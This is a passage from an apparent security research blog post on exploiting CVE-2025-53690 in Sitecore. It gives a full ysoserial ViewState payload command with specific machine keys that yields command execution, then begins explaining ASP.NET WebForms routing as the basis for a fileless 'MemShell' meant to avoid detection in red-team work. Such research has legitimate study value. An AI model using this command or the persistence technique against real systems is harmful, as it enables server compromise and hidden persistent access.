&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ysoserial.exe -p ViewState -g XamlAssemblyLoadFromFile -c &lt;span class="s2"&gt;&amp;#34;ExploitClass.cs;System.Web.dll;System.dll&amp;#34;&lt;/span&gt; --path&lt;span class="o"&gt;=&lt;/span&gt;/sitecore/blocked.aspx --decryptionkey&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&amp;#34;&lt;/span&gt; --validationalg&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;SHA1&amp;#34;&lt;/span&gt; --validationkey&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;After sending the payload with the &lt;code&gt;cmd&lt;/code&gt; header value set to &lt;code&gt;dir&lt;/code&gt;, we get the response:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image40.png"
width="3177"
height="1675"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image40_hu_527ce9fc39a05a01.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image40_hu_617184351f89483b.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="189"
data-flex-basis="455px"
&gt;&lt;/p&gt;
&lt;p&gt;Thus, we have successfully achieved the goal of echoing the command output in the response.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The story doesn&amp;rsquo;t end there :D The exploit above still has a significant limitation: &lt;strong&gt;Every time you want to exploit (run a command), you have to send a request to the aforementioned endpoint with a very large VIEWSTATE&lt;/strong&gt;, which makes it easier to be detected â‡’ &lt;strong&gt;Not suitable for Red Team campaigns&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;So, is there a way to mitigate this? The answer is &lt;strong&gt;MemShell&lt;/strong&gt; :D&lt;/p&gt;
&lt;p&gt;In previous blogs from &lt;strong&gt;sec.vnpt.vn&lt;/strong&gt;, we&amp;rsquo;ve learned about various types of MemShells in &lt;strong&gt;Java&lt;/strong&gt;, &lt;strong&gt;.NET MVC&lt;/strong&gt;, etc. But what about &lt;strong&gt;WebForms&lt;/strong&gt;? Is there a similar mechanism? :D Let&amp;rsquo;s dive deeper!&lt;/p&gt;
&lt;h3 id="memshell"&gt;MemShell
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;First, what is MemShell?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MemShell&lt;/strong&gt; (short for &lt;strong&gt;Memory Shell&lt;/strong&gt;) is a technique used to &lt;strong&gt;maintain persistent access&lt;/strong&gt; to the target system &lt;strong&gt;without writing any files&lt;/strong&gt;. Instead of deploying a traditional webshell (like an .aspx or .jsp file), MemShell operates &lt;strong&gt;entirely in the web application&amp;rsquo;s memory&lt;/strong&gt;, leveraging framework or runtime components to execute malicious code &lt;strong&gt;without leaving any physical traces&lt;/strong&gt; on the system. This makes MemShell a powerful tool that is &lt;strong&gt;extremely hard to detect&lt;/strong&gt; by traditional security tools like antivirus or file-monitoring systems.&lt;/p&gt;
&lt;p&gt;At its core, the &lt;strong&gt;MemShell technique&lt;/strong&gt; injects code into components of the &lt;strong&gt;request pipeline&lt;/strong&gt; (such as Filters, middleware, routing, etc.). Then, when the request pipeline reaches the attacker&amp;rsquo;s injected logic â‡’ &lt;strong&gt;arbitrary code is executed on the server&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;You can refer to previous articles on MemShell in Tomcat and .NET MVC here: ðŸ”— &lt;a class="link" href="https://sec.vnpt.vn/2022/12/ky-thuat-memory-webshell-trong-cac-dot-khai-thac-redteam" target="_blank" rel="noopener"
&gt;https://sec.vnpt.vn/2022/12/ky-thuat-memory-webshell-trong-cac-dot-khai-thac-redteam&lt;/a&gt; ðŸ”— &lt;a class="link" href="https://sec.vnpt.vn/2024/10/asp-net-mvc-memmory-webshell-filter" target="_blank" rel="noopener"
&gt;https://sec.vnpt.vn/2024/10/asp-net-mvc-memmory-webshell-filter&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Although both belong to the &lt;strong&gt;ASP.NET family&lt;/strong&gt;, &lt;strong&gt;ASP.NET WebForms does not have a Filter mechanism&lt;/strong&gt; in the request pipeline. Therefore, we need to find &lt;strong&gt;another similar mechanism&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;After some digging, I discovered a mechanism in the &lt;strong&gt;WebForms request pipeline&lt;/strong&gt; that can be exploited: &lt;strong&gt;Routing&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/routing.png"
width="624"
height="410"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/routing_hu_72646b3062b1cde.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/routing_hu_b235dedf62b2c2c9.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="152"
data-flex-basis="365px"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Routing in Web Forms&lt;/strong&gt; (introduced in .NET 4.0) was created to generate &lt;strong&gt;friendly URLs&lt;/strong&gt; (URLs without the .aspx extension), improving &lt;strong&gt;SEO&lt;/strong&gt; while preserving the traditional &lt;strong&gt;Page model&lt;/strong&gt;. For example, instead of /upload.aspx â‡’ we can configure routing so that /upload maps directly to that .aspx file. The URL no longer has .aspx â‡’ &lt;strong&gt;more user-friendly&lt;/strong&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id="overview-of-the-request-pipeline-in-aspnet"&gt;Overview of the Request Pipeline in ASP.NET
&lt;/h3&gt;&lt;p&gt;When an HTTP request is sent to an ASP.NET application:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;IIS&lt;/strong&gt; receives the HTTP request.&lt;/li&gt;
&lt;li&gt;IIS forwards the request to the &lt;strong&gt;ASP.NET ISAPI extension&lt;/strong&gt; (in &lt;strong&gt;Classic mode&lt;/strong&gt;) or the &lt;strong&gt;ASP.NET Integrated pipeline module&lt;/strong&gt; (in &lt;strong&gt;Integrated mode&lt;/strong&gt;).&lt;/li&gt;
&lt;li&gt;The request enters the &lt;strong&gt;ASP.NET Request Pipeline&lt;/strong&gt;, which includes:
&lt;ul&gt;
&lt;li&gt;Events of the &lt;code&gt;HttpApplication&lt;/code&gt; (such as &lt;code&gt;BeginRequest&lt;/code&gt;, &lt;code&gt;AuthenticateRequest&lt;/code&gt;, &lt;code&gt;AuthorizeRequest&lt;/code&gt;, &lt;code&gt;ResolveRequestCache&lt;/code&gt;, â€¦).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HttpModules&lt;/strong&gt; (modules that can &amp;ldquo;hook into&amp;rdquo; the above events).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HttpHandlers&lt;/strong&gt; (responsible for actual processing and returning the response to the client).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="where-does-routing-appear-in-the-pipeline"&gt;Where Does Routing Appear in the Pipeline?
&lt;/h3&gt;&lt;p&gt;The &lt;strong&gt;Routing module&lt;/strong&gt; (&lt;code&gt;UrlRoutingModule&lt;/code&gt;) is attached to the pipeline at the &lt;strong&gt;PostResolveRequestCache&lt;/strong&gt; stage.&lt;br&gt;
At this point, it checks the incoming URL to see if it matches any route defined in &lt;code&gt;RouteTable.Routes&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If a matching route is found:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;UrlRoutingModule&lt;/code&gt; creates a &lt;strong&gt;&lt;code&gt;RouteData&lt;/code&gt;&lt;/strong&gt; object.&lt;/li&gt;
&lt;li&gt;It assigns a specific &lt;strong&gt;&lt;code&gt;IRouteHandler&lt;/code&gt;&lt;/strong&gt; to handle the request.&lt;/li&gt;
&lt;li&gt;The request is then passed to the corresponding &lt;strong&gt;&lt;code&gt;HttpHandler&lt;/code&gt;&lt;/strong&gt; (e.g., &lt;code&gt;PageRouteHandler&lt;/code&gt; in Web Forms).&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="execution-flow-of-routing"&gt;Execution Flow of Routing:
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;IIS&lt;/span&gt; &lt;span class="err"&gt;â†’&lt;/span&gt; &lt;span class="n"&gt;ASP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NET&lt;/span&gt; &lt;span class="n"&gt;Pipeline&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;â†“&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;UrlRoutingModule&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PostResolveRequestCache&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;â†“&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Find&lt;/span&gt; &lt;span class="n"&gt;matching&lt;/span&gt; &lt;span class="n"&gt;RouteData&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;â†“&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Call&lt;/span&gt; &lt;span class="n"&gt;corresponding&lt;/span&gt; &lt;span class="n"&gt;IRouteHandler&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;â†“&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;PageRouteHandler&lt;/span&gt; &lt;span class="n"&gt;returns&lt;/span&gt; &lt;span class="n"&gt;PageHandler&lt;/span&gt; &lt;span class="p"&gt;(.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;â†“&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Execute&lt;/span&gt; &lt;span class="n"&gt;Page&lt;/span&gt; &lt;span class="n"&gt;Lifecycle&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;â†“&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Send&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="n"&gt;back&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Typically, these routes can be configured in the &lt;code&gt;Global.asax&lt;/code&gt; file. Example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="n"&gt;Application_Start&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;object&lt;/span&gt; &lt;span class="n"&gt;sender&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;EventArgs&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;RegisterRoutes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;RouteTable&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Routes&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="n"&gt;RegisterRoutes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;RouteCollection&lt;/span&gt; &lt;span class="n"&gt;routes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;routes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MapPageRoute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;routeName&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;ProductRoute&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;routeUrl&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;products/{category}/{id}&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;physicalFile&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;~/ProductDetails.aspx&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;However, in addition to the above method, we can also &lt;strong&gt;dynamically configure routes&lt;/strong&gt; using the following code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System.Web.Routing&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="n"&gt;AddDynamicRoute&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;RouteCollection&lt;/span&gt; &lt;span class="n"&gt;routes&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;RouteTable&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Routes&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;routes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MapPageRoute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;routeName&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;DynamicRoute&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;routeUrl&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;promo/{code}&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;physicalFile&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;~/PromoPage.aspx&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Moreover, we can create a &lt;strong&gt;Custom Route&lt;/strong&gt; with logic defined by ourselves by &lt;strong&gt;overriding&lt;/strong&gt; the two methods &lt;code&gt;GetRouteData&lt;/code&gt; and &lt;code&gt;GetVirtualPath&lt;/code&gt;, for example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyRoute&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;RouteBase&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;override&lt;/span&gt; &lt;span class="n"&gt;RouteData&lt;/span&gt; &lt;span class="n"&gt;GetRouteData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpContextBase&lt;/span&gt; &lt;span class="n"&gt;httpContext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;httpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AppRelativeCurrentExecutionFilePath&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TrimStart&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;~&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Equals&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;promo&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;StringComparison&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;routeData&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;RouteData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;PageRouteHandler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;~/PromoPage.aspx&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;routeData&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;override&lt;/span&gt; &lt;span class="n"&gt;VirtualPathData&lt;/span&gt; &lt;span class="n"&gt;GetVirtualPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;RequestContext&lt;/span&gt; &lt;span class="n"&gt;requestContext&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;RouteValueDictionary&lt;/span&gt; &lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// optional&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Then register this route using:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
